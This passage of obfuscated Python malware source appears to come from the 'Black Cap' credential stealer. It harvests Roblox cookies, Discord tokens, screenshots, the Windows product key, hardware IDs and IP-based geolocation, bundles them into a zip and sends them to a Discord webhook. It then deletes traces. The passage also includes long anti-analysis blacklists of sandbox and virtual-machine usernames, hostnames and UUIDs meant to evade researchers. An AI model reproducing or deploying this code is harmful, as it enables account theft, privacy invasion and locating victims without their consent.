            IlIlIIlIlIIIlI = IIIllllII(IIlllIIlIlIlI'HKCU')
        if IlIlIIlIlIIIlI:
            IIIIIIIllIllIIII.llIlllllIIIl.append(IlIlIIlIlIIIlI)
        if IIIIIIIllIllIIII.llIlllllIIIl:
            with open(IIIIIIIllIllIIII.llIIIIllIIl + "\\Roblox_Cookies.txt", "w") as lIIIIllIlIIIllIIl:
                for lIIllllllIl in IIIIIIIllIllIIII.llIlllllIIIl:
                    lIIIIllIlIIIllIIl.write(lIIllllllIl + '\n')
    def lIllIlIIll(IIIIIIIllIllIIII):
        lllIIIllI = ImageGrab.grab(
            bbox=None,
            include_layered_windows=False,
            all_screens=True,
            xdisplay=None
        )
        lllIIIllI.save(IIIIIIIllIllIIII.llIIIIllIIl + "\\Screenshot.png")
        lllIIIllI.close()
    def lllllllIIllIIl(IIIIIIIllIllIIII):
        llIlIIlIllllllllI = lIIIIllIlIIIllIIl"""
{lIlllIIIlIlllIIIlIIl} | {IIIlIlIllIIIlIIIlII}
Windows key: {IIIIIIIllIllIIII.IlIlIlIlI}
Windows version: {IIIIIIIllIllIIII.IIIIIIlIIIIlIllIlII}
RAM: {IllIllIIIlll}GB
DISK: {IIlllIIl}GB
HWID: {IIIIIIIllIllIIII.IIIllIIIlIIlIIlIll}
IP: {IIIIIIIllIllIIII.lIIlllllllII}
City: {IIIIIIIllIllIIII.IlIlllIIlllII}
Country: {IIIIIIIllIllIIII.IlllIIIlll}
Region: {IIIIIIIllIllIIII.IIlIIIIll}
Org: {IIIIIIIllIllIIII.llIlIlIlIl}
GoogleMaps: {IIIIIIIllIllIIII.llIIIllllIIll}
        """
        with open(IIIIIIIllIllIIII.llIIIIllIIl + "\\System_Info.txt", "w", encoding="utf-8", errors='ignore') as lIIIIllIlIIIllIIl:
            lIIIIllIlIIIllIIl.write(llIlIIlIllllllllI)
    def llIIIlIIIIllIlIIl(IIIIIIIllIllIIII):
        for lIIllllllIl in os.listdir(IIIIIIIllIllIIII.llIIIIllIIl):
            if lIIllllllIl.endswith('.txt'):
                lIllIIllI = IIIIIIIllIllIIII.llIIIIllIIl + IIIIIIIllIllIIII.lIIIllIllllII + lIIllllllIl
                with open(lIllIIllI, "r", errors="ignore") as lIlIllIIlIII:
                    llIllIlIllIllllll = lIlIllIIlIII.read()
                    if not llIllIlIllIllllll:
                        lIlIllIIlIII.close()
                        os.remove(lIllIIllI)
                    else:
                        with open(lIllIIllI, "w", encoding="utf-8", errors="ignore") as lIIIIllIlIIIllIIl:
                            lIIIIllIlIIIllIIl.write("Black Cap Create By KS.H | https://github.com/Kasd\n\n")
                        with open(lIllIIllI, "a", encoding="utf-8", errors="ignore") as IlIIIIlI:
                            IlIIIIlI.write(llIllIlIllIllllll + "\n\nasd | https://github.com/Kasd")
        lllIIlIIllIIlllIllll = ntpath.join(IIIIIIIllIllIIII.IIllIlIlllIlI, lIIIIllIlIIIllIIl'BC-[{lIIllllllIlnlIIIIllIlIIIllIIloIlIlIIlllllIlIIlIIlllIIIom}].zip')
        llIIIIlIlI = zipfile.ZipFile(lllIIlIIllIIlllIllll, "w", zipfile.ZIP_DEFLATED)
        lIIlIIIIIIIIl = ntpath.abspath(IIIIIIIllIllIIII.llIIIIllIIl)
        for lIlllllIIlIII, lIlIIlIllllllIlIIIIl, IIllIIIIlIllIllII in os.walk(IIIIIIIllIllIIII.llIIIIllIIl):
            for lIIIlllllIIllIII in IIllIIIIlIllIllII:
                lIIllIIIIlIIIlllI = ntpath.abspath(ntpath.join(lIlllllIIlIII, lIIIlllllIIllIII))
                lIIIIIlIllllIlIIIII = lIIllIIIIlIIIlllI[len(lIIlIIIIIIIIl) + 1:]
                llIIIIlIlI.write(lIIllIIIIlIIIlllI, lIIIIIlIllllIlIIIII)
        llIIIIlIlI.close()
        lIllllllIlIIllI, llIllIllIlIllIlIlII, IlIlIlIlll = 0, '', ''
        for lIlIIlIllllllIlIIIIl, IIIIlIIllIIIIlll, IIllIIIIlIllIllII in os.walk(IIIIIIIllIllIIII.llIIIIllIIl):
            for IlllllIIIllIIlIlI in IIllIIIIlIllIllII:
                llIllIllIlIllIlIlII += lIIIIllIlIIIllIIl"・{IlllllIIIllIIlIlI}\n"
                lIllllllIlIIllI += 1
        for IIlllIIIllllIl in IIIIIIIllIllIIII.IlIlIlIlll:
            IlIlIlIlll += lIIIIllIlIIIllIIl'{IIIIIIIlIlIIlllIIkn}\n\n'
        IIlIIIlIIlllIIlIIllI = lIIIIllIlIIIllIIl"{lIllllllIlIIlIlIIlllIII} Files Found: "
        llIIIlIIIIIlIIlIll = {
            'name': "vka",
            'avatar_url': 'https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/blackcap%20(2).png',
            'embeds': [
                {
                    'author': {
                        'name': lIIIIllIlIIIllIIl'asd',
                        'url': 'https://github.com/asd',
                        'icon_url': 'https://raw.githubusercontent.com/KSCHdsc/DestruCord-Inject/main/blackcap.gif'
                    },
                    'color': 374276,
                    'description': lIIIIllIlIIIllIIl'[has Geo Localised this guy]({sellIIIIllIlIIIllIIl.googlIIlIlIIIlIlIIlIImllIlIlIIIIIIllIlIIIlIIlllIIp})',
                    'fields': [
                        {
                            'name': '\u200b',
                            'value': lIIIIllIlIIIllIIl'''```fix
                                IP: {IIIIIIIllIllIIII.lIIlllllllII.replace(" ", " ") if IIIIIIIllIllIIII.lIIlllllllII else "N/A"}
                                Org: {IIIIIIIllIllIIII.llIlIlIlIl.replace(" ", " ") if IIIIIIIllIllIIII.llIlIlIlIl else "N/A"}
                                City: {IIIIIIIllIllIIII.IlIlllIIlllII.replace(" ", " ") if IIIIIIIllIllIIII.IlIlllIIlllII else "N/A"}
                                Region: {IIIIIIIllIllIIII.IIlIIIIll.replace(" ", " ") if IIIIIIIllIllIIII.IIlIIIIll else "N/A"}
                                Country: {IIIIIIIllIllIIII.IlllIIIlll.replace(" ", " ") if IIIIIIIllIllIIII.IlllIIIlll else "N/A"}```
                            '''.replace(' ', ''),
                            'inline': True
                        },
                        {
                            'name': '\u200b',
                            'value': lIIIIllIlIIIllIIl'''```fix
                                Computer Name: {IIIlIlIllIIIlIIIlII.replace(" ", " ")}
                                Windows Key: {IIIIIIIllIllIIII.IlIlIlIlI.replace(" ", " ")}
                                Windows Ver: {IIIIIIIllIllIIII.IIIIIIlIIIIlIllIlII.replace(" ", " ")}
                                Disk Stockage: {IIlllIIl}GB
                                Ram Stockage: {IllIllIIIlll}GB```
                            '''.replace(' ', ''),
                            'inline': True
                        },
                        {
                            'name': '**- Tokens:**',
                            'value': lIIIIllIlIIIllIIl'''```yaml
                                {IlIlIlIlll if IlIlIlIlll else "tokens not found"}```
                            '''.replace(' ', ''),
                            'inline': False
                        },
                        {
                            'name': IIlIIIlIIlllIIlIIllI,
                            'value': lIIIIllIlIIIllIIl'''```ini
                                [
                                {llIllIllIlIllIlIlII.strip()}
                                ]```
                            '''.replace(' ', ''),
                            'inline': False
                        }
                    ],
                    'footer': {
                        'text': 'asd'
                    }
                }
            ]
        }
        with open(lllIIlIIllIIlllIllll, 'rb') as lIIIIllIlIIIllIIl:
            if IIIIIIIllIllIIII.IlIlIlIIlllllIl in IIIIIIIllIllIIII.lIllIIlIIIlIl:
                httpx.post(IIIIIIIllIllIIII.lIllIIlIIIlIl, json=llIIIlIIIIIlIIlIll)
                httpx.post(IIIIIIIllIllIIII.lIllIIlIIIlIl, IIllIIIIlIllIllII={'upload_file': lIIIIllIlIIIllIIl})
        os.remove(lllIIlIIllIIlllIllll)
class IlIIllIlI(lIlIIIllIII):
    IlIllllIIIIIII = False
    def __init__(IIIIIIIllIllIIII):
        IIIIIIIllIllIIII.IIIIIlIIllIIII = list()
        IIIIIIIllIllIIII.IIllIIllI = [
            "05h00Gi0",
            "3u2v9m8",
            "43By4",
            "4tgiizsLimS",
            "6O4KyHhJXBiR",
            "7wjlGX7PjlW4",
            "8Nl0ColNQ5bq",
            "8VizSM",
            "Abby",
            "Amy",
            "AppOnFlySupport",
            "ASPNET",
            "azure",
            "BUiA1hkm",
            "BvJChRPnsxn",
            "cM0uEGN4do",
            "cMkNdS6",
            "DefaultAccount",
            "dOuyo8RV71",
            "DVrzi",
            "e60UW",
            "ecVtZ5wE",
            "EGG0p",
            "Frank",
            "fred",
            "G2DbYLDgzz8Y",
            "george",
            "GjBsjb",
            "Guest",
            "h7dk1xPr",
            "h86LHD",
            "Harry Johnson",
            "HEUeRzl",
            "hmarc",
            "ICQja5iT",
            "IVwoKUF",
            "j6SHA37KA",
            "j7pNjWM",
            "John",
            "jude",
            "Julia",
            "kEecfMwgj",
            "kFu0lQwgX5P",
            "KUv3bT4",
            "Lisa",
            "lK3zMR",
            "lmVwjj9b",
            "Louise",
            "Lucas",
            "mike",
            "Mr.None",
            "noK4zG7ZhOf",
            "o6jdigq",
            "o8yTi52T",
            "OgJb6GqgK0O",
            "patex",
            "PateX",
            "Paul Jones",
            "pf5vj",
            "PgfV1X",
            "PqONjHVwexsS",
            "pWOuqdTDQ",
            "PxmdUOpVyx",
            "QfofoG",
            "QmIS5df7u",
            "QORxJKNk",
            "qZo9A",
            "RDhJ0CNFevzX",
            "RGzcBUyrznReg",
            "S7Wjuf",
            "server",
            "SqgFOf3G",
            "Steve",
            "test",
            "TVM",
            "txWas1m2t",
            "umyUJ",
            "Uox1tzaMO",
            "User01",
            "w0fjuOVmCcP5A",
            "WDAGUtilityAccount",
            "XMiMmcKziitD",
            "xPLyvzr8sgC",
            "ykj0egq7fze",
            "DdQrgc",
            "ryjIJKIrOMs",
            "nZAp7UBVaS1",
            "zOEsT",
            "l3cnbB8Ar5b8",
            "xUnUy",
            "fNBDSlDTXY",
            "vzY4jmH0Jw02",
            "gu17B",
            "UiQcX",
            "21zLucUnfI85",
            "OZFUCOD6",
            "8LnfAai9QdJR",
            "5sIBK",
            "rB5BnfuR2",
            "GexwjQdjXG",
            "IZZuXj",
            "ymONofg",
            "dxd8DJ7c",
            "JAW4Dz0",
            "GJAm1NxXVm",
            "UspG1y1C",
            "equZE3J",
            "BXw7q",
            "lubi53aN14cU",
            "5Y3y73",
            "9yjCPsEYIMH",
            "GGw8NR",
            "JcOtj17dZx",
            "05KvAUQKPQ",
            "64F2tKIqO5",
            "7DBgdxu",
            "uHUQIuwoEFU",
            "gL50ksOp",
            "Of20XqH4VL",
            "tHiF2T",
            "sal.rosenburg",
            "hbyLdJtcKyN1",
            "Rt1r7",
            "Administrator",
            "katorres"
        ]
        IIIIIIIllIllIIII.llIlIIII = [
             "00900BC83803",
             "0CC47AC83803",
             "6C4E733F-C2D9-4",
             "ACEPC",
             "AIDANPC",
             "ALENMOOS-PC",
             "ALIONE",
             "APPONFLY-VPS",
             "ARCHIBALDPC",
             "azure",
             "B30F0242-1C6A-4",
             "BAROSINO-PC",
             "BECKER-PC",
             "BEE7370C-8C0C-4",
             "COFFEE-SHOP",
             "COMPNAME_4047",
             "d1bnJkfVlH",
             "DESKTOP-19OLLTD",
             "DESKTOP-1PYKP29",
             "DESKTOP-1Y2433R",
             "DESKTOP-4U8DTF8",
             "DESKTOP-54XGX6F",
             "DESKTOP-5OV9S0O",
             "DESKTOP-6AKQQAM",
             "DESKTOP-6BMFT65",
             "DESKTOP-70T5SDX",
             "DESKTOP-7AFSTDP",
             "DESKTOP-7XC6GEZ",
             "DESKTOP-8K9D93B",
             "DESKTOP-AHGXKTV",
             "DESKTOP-ALBERTO",
             "DESKTOP-B0T93D6",
             "DESKTOP-BGN5L8Y",
             "DESKTOP-BUGIO",
             "DESKTOP-BXJYAEC",
             "DESKTOP-CBGPFEE",
             "DESKTOP-CDQE7VN",
             "DESKTOP-CHAYANN",
             "DESKTOP-CM0DAW8",
             "DESKTOP-CNFVLMW",
             "DESKTOP-CRCCCOT",
             "DESKTOP-D019GDM",
             "DESKTOP-D4FEN3M",
             "DESKTOP-DE369SE",
             "DESKTOP-DIL6IYA",
             "DESKTOP-ECWZXY2",
             "DESKTOP-F7BGEN9",
             "DESKTOP-FSHHZLJ",
             "DESKTOP-G4CWFLF",
             "DESKTOP-GELATOR",
             "DESKTOP-GLBAZXT",
             "DESKTOP-GNQZM0O",
             "DESKTOP-GPPK5VQ",
             "DESKTOP-HASANLO",
             "DESKTOP-HQLUWFA",
             "DESKTOP-HSS0DJ9",
             "DESKTOP-IAPKN1P",
             "DESKTOP-IFCAQVL",
             "DESKTOP-ION5ZSB",
             "DESKTOP-JQPIFWD",
             "DESKTOP-KALVINO",
             "DESKTOP-KOKOVSK",
             "DESKTOP-NAKFFMT",
             "DESKTOP-NKP0I4P",
             "DESKTOP-NM1ZPLG",
             "DESKTOP-NTU7VUO",
             "DESKTOP-QUAY8GS",
             "DESKTOP-RCA3QWX",
             "DESKTOP-RHXDKWW",
             "DESKTOP-S1LFPHO",
             "DESKTOP-SUPERIO",
             "DESKTOP-V1L26J5",
             "DESKTOP-VIRENDO",
             "DESKTOP-VKNFFB6",
             "DESKTOP-VRSQLAG",
             "DESKTOP-VWJU7MF",
             "DESKTOP-VZ5ZSYI",
             "DESKTOP-W8JLV9V",
             "DESKTOP-WG3MYJS",
             "DESKTOP-WI8CLET",
             "DESKTOP-XOY7MHS",
             "DESKTOP-Y8ASUIL",
             "DESKTOP-YW9UO1H",
             "DESKTOP-ZJF9KAN",
             "DESKTOP-ZMYEHDA",
             "DESKTOP-ZNCAEAM",
             "DESKTOP-ZOJJ8KL",
             "DESKTOP-ZV9GVYL",
             "DOMIC-DESKTOP",
             "EA8C2E2A-D017-4",
             "ESPNHOOL",
             "GANGISTAN",
             "GBQHURCC",
             "GRAFPC",
             "GRXNNIIE",
             "gYyZc9HZCYhRLNg",
             "JBYQTQBO",
             "JERRY-TRUJILLO",
             "JOHN-PC",
             "JUDES-DOJO",
             "JULIA-PC",
             "LANTECH-LLC",
             "LISA-PC",
             "LOUISE-PC",
             "LUCAS-PC",
             "MIKE-PC",
             "NETTYPC",
             "ORELEEPC",
             "ORXGKKZC",
             "Paul Jones",
             "PC-DANIELE",
             "PROPERTY-LTD",
             "Q9IATRKPRH",
             "QarZhrdBpj",
             "RALPHS-PC",
             "SERVER-PC",
             "SERVER1",
             "Steve",
             "SYKGUIDE-WS17",
             "T00917",
             "test42",
             "TIQIYLA9TW5M",
             "TMKNGOMU",
             "TVM-PC",
             "VONRAHEL",
             "WILEYPC",
             "WIN-5E07COS9ALR",
             "WINDOWS-EEL53SN",
             "WINZDS-1BHRVPQU",
             "WINZDS-22URJIBV",
             "WINZDS-3FF2I9SN",
             "WINZDS-5J75DTHH",
             "WINZDS-6TUIHN7R",
             "WINZDS-8MAEI8E4",
             "WINZDS-9IO75SVG",
             "WINZDS-AM76HPK2",
             "WINZDS-B03L9CEO",
             "WINZDS-BMSMD8ME",
             "WINZDS-BUAOKGG1",
             "WINZDS-K7VIK4FC",
             "WINZDS-QNGKGN59",
             "WINZDS-RST0E8VU",
             "WINZDS-U95191IG",
             "WINZDS-VQH86L5D",
             "WORK",
             "XC64ZB",
             "XGNSVODU",
             "ZELJAVA",
             "3CECEFC83806",
             "C81F66C83805",
             "DESKTOP-USLVD7G",
             "DESKTOP-AUPFKSY",
             "DESKTOP-RP4FIBL",
             "DESKTOP-6UJBD2J",
             "DESKTOP-LTMCKLA",
             "DESKTOP-FLTWYYU",
             "DESKTOP-WA2BY3L",
             "DESKTOP-UBDJJ0A",
             "DESKTOP-KXP5YFO",
             "DESKTOP-DAU8GJ2",
             "DESKTOP-FCRB3FM",
             "DESKTOP-VYRNO7M",
             "DESKTOP-PKQNDSR",
             "DESKTOP-SCNDJWE",
             "DESKTOP-RSNLFZS",
             "DESKTOP-MWFRVKH",
             "DESKTOP-QLN2VUF",
             "DESKTOP-62YPFIQ",
             "DESKTOP-PA0FNV5",
             "DESKTOP-B9OARKC",
             "DESKTOP-J5XGGXR",
             "DESKTOP-JHUHOTB",
             "DESKTOP-64ACUCH",
             "DESKTOP-SUNDMI5",
             "DESKTOP-GCN6MIO",
             "FERREIRA-W10",
             "DESKTOP-MJC6500",
             "DESKTOP-WS7PPR2",
             "DESKTOP-XWQ5FUV",
             "DESKTOP-UHHSY4R",
             "DESKTOP-ZJRWGX5",
             "DESKTOP-ZYQYSRD",
             "WINZDS-MILOBM35",
             "DESKTOP-K8Y2SAM",
             "DESKTOP-4GCZVJU",
             "DESKTOP-O6FBMF7",
             "DESKTOP-WDT1SL6",
             "EIEEIFYE",
             "CRYPTODEV222222",
             "EFA0FDEC-8FA7-4",
             "DESKTOP-O7BI3PT",
             "DESKTOP-UHQW8PI",
             "WINZDS-PU0URPVI",
             "ABIGAI",
        ]
        IIIIIIIllIllIIII.lIIIllllllIIIIIlllll = [
             "00000000-0000-0000-0000-000000000000",
             "00000000-0000-0000-0000-50E5493391EF",
             "00000000-0000-0000-0000-AC1F6BD047A0",
             "00000000-0000-0000-0000-AC1F6BD04850",
             "00000000-0000-0000-0000-AC1F6BD048D6",
             "00000000-0000-0000-0000-AC1F6BD048DC",
             "00000000-0000-0000-0000-AC1F6BD048F8",
             "00000000-0000-0000-0000-AC1F6BD048FE",
             "00000000-0000-0000-0000-AC1F6BD04900",
             "00000000-0000-0000-0000-AC1F6BD0491C",
             "00000000-0000-0000-0000-AC1F6BD04926",
             "00000000-0000-0000-0000-AC1F6BD04928",
             "00000000-0000-0000-0000-AC1F6BD04972",
             "00000000-0000-0000-0000-AC1F6BD04976",
             "00000000-0000-0000-0000-AC1F6BD04978",
             "00000000-0000-0000-0000-AC1F6BD04986",
             "00000000-0000-0000-0000-AC1F6BD049B8",
             "00000000-0000-0000-0000-AC1F6BD04C0A",
             "00000000-0000-0000-0000-AC1F6BD04D06",
             "00000000-0000-0000-0000-AC1F6BD04D08",
             "00000000-0000-0000-0000-AC1F6BD04D8E",
             "00000000-0000-0000-0000-AC1F6BD04D98",
             "00000000-0000-0000-0000-AC1F6BD04DC0",
             "00000000-0000-0000-0000-AC1F6BD04DCC",
             "02AD9898-FA37-11EB-AC55-1D0C0A67EA8A",
             "032E02B4-0499-05C3-0806-3C0700080009",
             "03AA02FC-0414-0507-BC06-D70700080009",
             "03D40274-0435-05BF-D906-D20700080009",
             "03DE0294-0480-05DE-1A06-350700080009",
             "050C3342-FADD-AEDF-EF24-C6454E1A73C9",
             "05790C00-3B21-11EA-8000-3CECEF4400D0",
             "0700BEF3-1410-4284-81B1-E5C17FA9E18F",
             "07AF2042-392C-229F-8491-455123CC85FB",
             "07E42E42-F43D-3E1C-1C6B-9C7AC120F3B9",
             "08C1E400-3C56-11EA-8000-3CECEF43FEDE",
             "0910CBA3-B396-476B-A7D7-716DB90F5FB9",
             "0934E336-72E4-4E6A-B3E5-383BD8E938C3",
             "0A36B1E3-1F6B-47DE-8D72-D4F46927F13F",
             "0A9D60D4-9A32-4317-B7C0-B11B5C677335",
             "0D748400-3B00-11EA-8000-3CECEF44007E",
             "0F377508-5106-45F4-A0D6-E8352F51A8A5",
             "104F9B96-5B46-4567-BF56-0066C1C6F7F0",
             "11111111-2222-3333-4444-555555555555",
             "119602E8-92F9-BD4B-8979-DA682276D385",
             "12204D56-28C0-AB03-51B7-44A8B7525250",
             "12EE3342-87A2-32DE-A390-4C2DA4D512E9",
             "138D921D-680F-4145-BDFF-EC463E70C77D",
             "13A61742-AF45-EFE4-70F4-05EF50767784",
             "14692042-A78B-9563-D59D-EB7DD2639037",
             "1AAD2042-66E8-C06A-2F81-A6A4A6A99093",
             "1B5D3FFD-A28E-4F11-9CD6-FF148989548C",
             "1D4D3342-D6C4-710C-98A3-9CC6571234D5",
             "213D2878-0E33-4D8C-B0D1-31425B9DE674",
             "222EFE91-EAE3-49F1-8E8D-EBAE067F801A",
             "26645000-3B67-11EA-8000-3CECEF440124",
             "2AB86800-3C50-11EA-8000-3CECEF440130",
             "2C5C2E42-E7B1-4D75-3EA3-A325353CDB72",
             "2CEA2042-9B9B-FAC1-44D8-159FE611FCCC",
             "2DD1B176-C043-49A4-830F-C623FFB88F3C",
             "2E6FB594-9D55-4424-8E74-CE25A25E36B0",
             "2F94221A-9D07-40D9-8C98-87CB5BFC3549",
             "2FBC3342-6152-674F-08E4-227A81CBD5F5",
             "34419E14-4019-11EB-9A22-6C4AB634B69A",
             "361E3342-9FAD-AC1C-F1AD-02E97892270F",
             "365B4000-3B25-11EA-8000-3CECEF44010C",
             "38813342-D7D0-DFC8-C56F-7FC9DFE5C972",
             "38AB3342-66B0-7175-0B23-F390B3728B78",
             "3A9F3342-D1F2-DF37-68AE-C10F60BFB462",
             "3EDC0561-C455-4D64-B176-3CFBBBF3FA47",
             "3F284CA4-8BDF-489B-A273-41B44D668F6D",
             "3F3C58D1-B4F2-4019-B2A2-2A500E96AF2E",
             "3FADD8D6-3754-47C4-9BFF-0E35553DD5FB",
             "40384E87-1FBA-4096-9EA1-D110F0EA92A8",
             "40F100F9-401C-487D-8D37-48107C6CE1D3",
             "418F0D5B-FCB6-41F5-BDA5-94C1AFB240ED",
             "41B73342-8EA1-E6BF-ECB0-4BC8768D86E9",
             "42A82042-3F13-512F-5E3D-6BF4FFFD8518",
             "44B94D56-65AB-DC02-86A0-98143A7423BF",
             "4729AEB0-FC07-11E3-9673-CE39E79C8A00",
             "481E2042-A1AF-D390-CE06-A8F783B1E76A",
             "48941AE9-D52F-11DF-BBDA-503734826431",
             "49434D53-0200-9036-2500-369025000C65",
             "49434D53-0200-9036-2500-369025003865",
             "49434D53-0200-9036-2500-369025003A65",
             "49434D53-0200-9036-2500-369025003AF0",
             "49434D53-0200-9036-2500-369025005CF0",
             "49434D53-0200-9036-2500-36902500F022",
             "49434D53-0200-9065-2500-659025002274",
             "49434D53-0200-9065-2500-659025005073",
             "49434D53-0200-9065-2500-659025008074",
             "49434D53-0200-9065-2500-65902500E439",
             "499B0800-3C18-11EA-8000-3CECEF43FEA4",
             "4C4C4544-0050-3710-8058-CAC04F59344A",
             "4CB82042-BA8F-1748-C941-363C391CA7F3",
             "4CE94980-D7DA-11DD-A621-08606E889D9B",
             "4D4DDC94-E06C-44F4-95FE-33A1ADA5AC27",
             "4DC32042-E601-F329-21C1-03F27564FD6C",
             "4EDF3342-E7A2-5776-4AE5-57531F471D56",
             "51646514-93E1-4CB6-AF29-036B45D14CBF",
             "52A1C000-3BAB-11EA-8000-3CECEF440204",
             "56B9F600-3C1C-11EA-8000-3CECEF4401DE",
             "59C68035-4B21-43E8-A6A6-BD734C0EE699",
             "5BD24D56-789F-8468-7CDC-CAA7222CC121",
             "5C1CA40D-EF14-4DF8-9597-6C0B6355D0D6",
             "5CC7016D-76AB-492D-B178-44C12B1B3C73",
             "5E3E7FE0-2636-4CB7-84F5-8D2650FFEC0E",
             "5E573342-6093-4F2D-5F78-F51B9822B388",
             "5EBC5C00-3B70-11EA-8000-3CECEF4401DA",
             "5EBD2E42-1DB8-78A6-0EC3-031B661D5C57",
             "60C83342-0A97-928D-7316-5F1080A78E72",
             "612F079A-D69B-47EA-B7FF-13839CD17404",
             "63203342-0EB0-AA1A-4DF5-3FB37DBB0670",
             "63DE70B4-1905-48F2-8CC4-F7C13B578B34",
             "63FA3342-31C7-4E8E-8089-DAFF6CE5E967",
             "64176F5E-8F74-412F-B3CF-917EFA5FB9DB",
             "6608003F-ECE4-494E-B07E-1C4615D1D93C",
             "66729280-2B0C-4BD0-8131-950D86871E54",
             "66CC1742-AAC7-E368-C8AE-9EEB22BD9F3B",
             "671BC5F7-4B0F-FF43-B923-8B1645581DC8",
             "67442042-0F69-367D-1B2E-1EE846020090",
             "67C5A563-3218-4718-8251-F38E3F6A89C1",
             "67E595EB-54AC-4FF0-B5E3-3DA7C7B547E3",
             "686D4936-87C1-4EBD-BEB7-B3D92ECA4E28",
             "6881083C-EE5A-43E7-B7E3-A0CE9227839C",
             "69AEA650-3AE3-455C-9F80-51159BAE5EAE",
             "6A669639-4BD2-47E5-BE03-9CBAFC9EF9B3",
             "6AA13342-49AB-DC46-4F28-D7BDDCE6BE32",
             "6ECEAF72-3548-476C-BD8D-73134A9182C8",
             "6F3CA5EC-BEC9-4A4D-8274-11168F640058",
             "71522042-DA0B-6793-668B-CE95AEA7FE21",
             "72492D47-52EF-427A-B623-D4F2192F97D4",
             "73163342-B704-86D5-519B-18E1D191335C",
             "777D84B3-88D1-451C-93E4-D235177420A7",
             "782ED390-AE10-4727-A866-07018A8DED22",
             "79AF5279-16CF-4094-9758-F88A616D81B4",
             "7A484800-3B19-11EA-8000-3CECEF440122",
             "7AB5C494-39F5-4941-9163-47F54D6D5016",
             "7CA33342-A88C-7CD1-1ABB-7C0A82F488BF",
             "7D341C16-E8E9-42EA-8779-93653D877231",
             "7D6A0A6D-394E-4179-9636-662A8D2C7304",
             "7E4755A6-7160-4982-8F5D-6AA481749F10",
             "80152042-2F34-11D1-441F-5FADCA01996D",
             "83BFD600-3C27-11EA-8000-3CECEF4400B4",
             "844703CF-AA4E-49F3-9D5C-74B8D1F5DCB6",
             "84782042-E646-50A0-159F-A8E75D4F9402",
             "84FE3342-6C67-5FC6-5639-9B3CA3D775A1",
             "84FEEFBC-805F-4C0E-AD5B-A0042999134D",
             "8703841B-3C5E-461C-BE72-1747D651CE89",
             "88DC3342-12E6-7D62-B0AE-C80E578E7B07",
             "8B4E8278-525C-7343-B825-280AEBCD3BCB",
             "8DA62042-8B59-B4E3-D232-38B29A10964A",
             "8EC60B88-7F2B-42DA-B8C3-4E2EF2A8C603",
             "907A2A79-7116-4CB6-9FA5-E5A58C4587CD",
             "90A83342-D7E7-7A14-FFB3-2AA345FDBC89",
             "91625303-5211-4AAC-9842-01A41BA60D5A",
             "91A9EEDB-4652-4453-AC5B-8E92E68CBCF5",
             "921E2042-70D3-F9F1-8CBD-B398A21F89C6",
             "94515D88-D62B-498A-BA7C-3614B5D4307C",
             "95BF6A00-3C63-11EA-8000-3CECEF43FEB8",
             "96BB3342-6335-0FA8-BA29-E1BA5D8FEFBE",
             "9921DE3A-5C1A-DF11-9078-563412000026",
             "9B2F7E00-6F4C-11EA-8000-3CECEF467028",
             "9C6D1742-046D-BC94-ED09-C36F70CC9A91",
             "9FC997CA-5081-4751-BC78-CE56D06F6A62",
             "A100EFD7-4A31-458F-B7FE-2EF95162B32F",
             "A15A930C-8251-9645-AF63-E45AD728C20C",
             "A19323DA-80B2-48C9-9F8F-B21D08C3FE07",
             "A1A849F7-0D57-4AD3-9073-C79D274EECC8",
             "A2339E80-BB69-4BF5-84BC-E9BE9D574A65",
             "A5CE2042-8D25-24C4-71F7-F56309D7D45F",
             "A6A21742-8023-CED9-EA8D-8F0BC4B35DEA",
             "A7721742-BE24-8A1C-B859-D7F8251A83D3",
             "A9C83342-4800-0578-1EE8-BA26D2A678D2",
             "AAFC2042-4721-4E22-F795-A60296CAC029",
             "ACA69200-3C4C-11EA-8000-3CECEF4401AA",
             "ADEEEE9E-EF0A-6B84-B14B-B83A54AFC548",
             "AF1B2042-4B90-0000-A4E4-632A1C8C7EB1",
             "B1112042-52E8-E25B-3655-6A4F54155DBF",
             "B22B623B-6B62-4F9B-A9D3-94A15453CEF4",
             "B5B77895-D40B-4F30-A565-6EF72586A14A",
             "B6464A2B-92C7-4B95-A2D0-E5410081B812",
             "B9DA2042-0D7B-F938-8E8A-DA098462AAEC",
             "BB233342-2E01-718F-D4A1-E7F69D026428",
             "BB64E044-87BA-C847-BC0A-C797D1A16A50",
             "BE784D56-81F5-2C8D-9D4B-5AB56F05D86E",
             "BFE62042-E4E1-0B20-6076-C5D83EDFAFCE",
             "C0342042-AF96-18EE-C570-A5EFA8FF8890",
             "C249957A-AA08-4B21-933F-9271BEC63C85",
             "C364B4FE-F1C1-4F2D-8424-CB9BD735EF6E",
             "C51E9A00-3BC3-11EA-8000-3CECEF440034",
             "C6B32042-4EC3-6FDF-C725-6F63914DA7C7",
             "C7D23342-A5D4-68A1-59AC-CF40F735B363",
             "C9283342-8499-721F-12BE-32A556C9A7A8",
             "CC4AB400-3C66-11EA-8000-3CECEF43FE56",
             "CC5B3F62-2A04-4D2E-A46C-AA41B7050712",
             "CD74107E-444E-11EB-BA3A-E3FDD4B29537",
             "CE352E42-9339-8484-293A-BD50CDC639A5",
             "CEFC836C-8CB1-45A6-ADD7-209085EE2A57",
             "CF1BE00F-4AAF-455E-8DCD-B5B09B6BFA8F",
             "D2DC3342-396C-6737-A8F6-0C6673C1DE08",
             "D4260370-C9F1-4195-95A8-585611AE73F2",
             "D4C44C15-4BAE-469B-B8FD-86E5C7EB89AB",
             "D5DD3342-46B5-298A-2E81-5CA6867168BE",
             "D7382042-00A0-A6F0-1E51-FD1BBF06CD71",
             "D7958D98-A51E-4B34-8C51-547A6C2E6615",
             "D8C30328-1B06-4611-8E3C-E433F4F9794E",
             "D9142042-8F51-5EFF-D5F8-EE9AE3D1602A",
             "DBC22E42-59F7-1329-D9F2-E78A2EE5BD0D",
             "DBCC3514-FA57-477D-9D1F-1CAF4CC92D0F",
             "DD45F600-3C63-11EA-8000-3CECEF440156",
             "DD9C3342-FB80-9A31-EB04-5794E5AE2B4C",
             "DEAEB8CE-A573-9F48-BD40-62ED6C223F20",
             "E08DE9AA-C704-4261-B32D-57B2A3993518",
             "E0C806ED-B25A-4744-AD7D-59771187122E",
             "E1BA2E42-EFB1-CDFD-7A84-8A39F747E0C5",
             "E2342042-A1F8-3DCF-0182-0E63D607BCC7",
             "E3BB3342-02A8-5613-9C92-3747616194FD",
             "E57F6333-A2AC-4F65-B442-20E928C0A625",
             "E67640B3-2B34-4D7F-BD62-59A1822DDBDC",
             "E6DBCCDF-5082-4479-B61A-6990D92ACC5F",
             "E773CC89-EFB8-4DB6-A46E-6CCA20FE4E1A",
             "EADD1742-4807-00A0-F92E-CCD933E9D8C1",
